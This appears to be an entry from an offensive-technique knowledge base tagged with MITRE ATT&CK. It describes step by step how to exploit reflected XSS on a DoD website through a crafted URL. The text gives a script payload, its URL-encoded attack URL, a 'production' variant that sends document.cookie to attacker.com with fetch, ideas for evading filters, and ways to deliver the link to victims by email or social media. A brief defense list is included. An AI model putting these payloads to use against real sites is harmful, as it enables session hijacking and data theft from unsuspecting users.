---
id: proc-reflected-xss-url-craft-184750
tags:
  - xss
  - reflected-xss
  - javascript
  - url-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.780Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Crafting-Malicious-URL-for-Reflected-XSS

## Summary

This procedure demonstrates how to exploit a reflected XSS vulnerability by crafting a URL that injects and executes malicious JavaScript in a victim's browser when they access a vulnerable DoD website parameter, such as a search query or redirect field.

## Description

Reflected XSS occurs when user input from a URL parameter is inadequately sanitized and echoed back in the HTML response, allowing script injection. In this DoD website case, an attacker identifies a reflected input point (e.g., ?search=), encodes a JavaScript payload to evade filters, and crafts a full URL. Upon victim access, the payload executes, enabling actions like stealing cookies (e.g., via XMLHttpRequest to attacker server) or altering page content. Prerequisites include public website access and basic JavaScript knowledge; no authentication is needed. Expected outcomes: Script execution confirming vulnerability, with potential for session hijacking or phishing escalation.

## Requirements

1. Access to a web browser with developer tools for testing payloads
2. Knowledge of the vulnerable URL and parameter (e.g., from reconnaissance or error messages)
3. URL encoding capability to handle special characters in payloads
4. A method to deliver the URL to victims (e.g., email, social media)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding for user inputs)
- Deploy Content Security Policy (CSP) headers to restrict script execution
- Use Web Application Firewall (WAF) rules to block common XSS payloads
- Monitor server logs for suspicious URL parameters containing script tags
- Educate users on phishing risks and verify links before clicking

## Objectives

1. Inject and reflect JavaScript payload to execute in victim browser
2. Steal sensitive data like session cookies or form inputs
3. Modify displayed content to facilitate further attacks (e.g., fake login prompts)

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Scan the DoD website for pages that reflect user input, such as search results, error pages, or redirects. Use browser dev tools to inspect how parameters are rendered in HTML.

No specific command; manually test by appending benign inputs like ?q=test to the base URL and check if 'test' appears unsanitized in the response source.

> Look for direct reflection without encoding; if found, proceed to payload crafting.

### Step 2: Craft and Encode Payload

**Context**: Create a simple JavaScript payload to test execution, such as alerting a message or logging cookies. Encode it to bypass filters (e.g., use %3C for <).

Example payload: <script>alert(document.cookie)</script>

Encoded: %3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

Append to URL: https://dod-website.example.gov/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

> Access the URL in a browser; if an alert shows cookies, the vulnerability is confirmed. For production, replace alert with exfiltration: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>

### Step 3: Test and Validate Execution

**Context**: Verify the payload executes in the browser context without errors, confirming arbitrary code run capability.

Load the crafted URL and observe:

- Script execution (alert or network request to attacker server)
- No CSP blocks or sanitization stripping the payload

> Success: Payload runs; failure: Payload is escaped or blocked—iterate with obfuscated variants like using img src onerror.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- reflected-xss
- javascript
- web-exploit
